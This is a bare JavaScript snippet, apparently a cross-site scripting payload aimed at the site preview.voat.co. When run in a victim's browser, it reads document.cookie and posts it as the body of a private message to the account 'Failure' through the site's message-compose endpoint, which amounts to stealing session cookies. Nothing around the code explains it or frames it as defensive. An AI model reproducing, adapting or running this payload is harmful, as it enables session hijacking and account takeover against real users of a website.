var xhr = new XMLHttpRequest();xhr.open("POST", "http://preview.voat.co/messages/compose?recipient=Failure", true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send("Sender=&Recipient=Failure&Subject=ayy&cols=1&rows=1&Body"+document.cookie);
